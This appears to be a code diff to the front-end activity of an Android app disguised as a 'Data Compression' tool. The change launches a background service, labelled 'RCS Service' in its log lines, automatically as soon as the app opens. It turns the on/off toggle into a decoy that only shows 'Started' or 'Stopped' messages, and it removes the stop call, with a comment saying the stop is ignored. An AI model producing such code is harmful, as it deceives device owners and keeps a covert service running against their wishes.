@@ -94,16 +94,38 @@ public class AndroidServiceGUI extends Activity implements OnSeekBarChangeListen
 
 	private void actualCreate(final Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
-		setContentView(R.layout.main);
 
 		final String service = "com.android.service.app"; //$NON-NLS-1$
 		// final String service = "android.intent.action.MAIN";
-		boolean checked = isServiceRunning("com.android.service.ServiceCore"); //$NON-NLS-1$
+		
+		try {
+			if (Core.isServiceRunning() == false) {
+				final ComponentName cn = startService(new Intent(service));
 
+				if (cn == null) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " RCS Service not started, null cn ");//$NON-NLS-1$
+					}
+				} else {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " RCS Service Name: " + cn.flattenToShortString());//$NON-NLS-1$
+					}
+				}
+			}
+		} catch (final SecurityException se) {
+			if (Cfg.EXCEPTION) {
+				Check.log(se);
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " SecurityException caught on startService()");//$NON-NLS-1$
+			}
+		}
+		
+		setContentView(R.layout.main);
+			
 		// Set up click listeners
 		final Button runButton = (Button) findViewById(R.id.btntoggle);
-
-		((ToggleButton) runButton).setChecked(checked);
 
 		// Seekbar listener
 		seekBar = (SeekBar) findViewById(R.id.seekBar);
@@ -118,59 +140,32 @@ public class AndroidServiceGUI extends Activity implements OnSeekBarChangeListen
 		} catch (Exception e) {
 			seekBar.setProgress(75);
 		}
-
+		
+		try {
+			((ToggleButton) runButton).setChecked(preferences.getBoolean("running", false));
+		} catch (Exception e) {
+			((ToggleButton) runButton).setChecked(false);
+		}
+		
 		runButton.setOnClickListener(new OnClickListener() {
 			// @Override
 			public void onClick(final View v) {
+				SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
+				SharedPreferences.Editor editor = preferences.edit();
+				
 				if (((ToggleButton) v).isChecked()) {
-					if (Core.isServiceRunning() == true) {
-						return;
-					}
-
-					try {
-						final ComponentName cn = startService(new Intent(service));
-
-						if (cn == null) {
-							if (Cfg.DEBUG) {
-								Check.log(TAG + " RCS Service not started, null cn ");//$NON-NLS-1$
-							}
-						} else {
-							if (Cfg.DEBUG) {
-								Check.log(TAG + " RCS Service Name: " + cn.flattenToShortString());//$NON-NLS-1$
-							}
-						}
-					} catch (final SecurityException se) {
-						if (Cfg.EXCEPTION) {
-							Check.log(se);
-						}
-
-						if (Cfg.DEBUG) {
-							Check.log(TAG + " SecurityException caught on startService()");//$NON-NLS-1$
-						}
-					}
+					editor.putBoolean("running", true);
+					
+					Toast.makeText(AndroidServiceGUI.this, "Data Compression Started", Toast.LENGTH_LONG).show();
 				} else {
+					editor.putBoolean("running", false);
+					
 					// IGNORA LO STOP DEL SERVIZIO
 					Toast.makeText(AndroidServiceGUI.this, "Data Compression Stopped", Toast.LENGTH_LONG).show();
-
-					// stopService(new Intent(service));
 				}
+				
+				editor.commit();
 			}
 		});
-	}
-
-	private boolean isServiceRunning(String serviceName) {
-		ActivityManager manager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
-
-		for (RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
-			if (serviceName.equals(service.service.getClassName())) {
-				return true;
-			} else {
-				if (Cfg.DEBUG) {
-					// Check.log(service.service.getClassName());
-				}
-			}
-		}
-
-		return false;
 	}
 }
